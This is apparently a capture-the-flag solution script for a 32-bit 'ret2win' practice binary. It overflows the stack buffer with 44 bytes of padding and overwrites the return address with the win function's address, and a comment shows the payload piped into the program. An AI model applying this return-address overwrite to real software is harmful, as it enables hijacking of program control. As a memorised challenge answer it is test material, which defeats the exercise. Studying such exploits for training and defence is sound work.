import struct

ret2win = 0x08048659

pad = 'A'*44
ret = struct.pack("I", ret2win)

print pad + ret

# run: python ex.py | ./ret2win32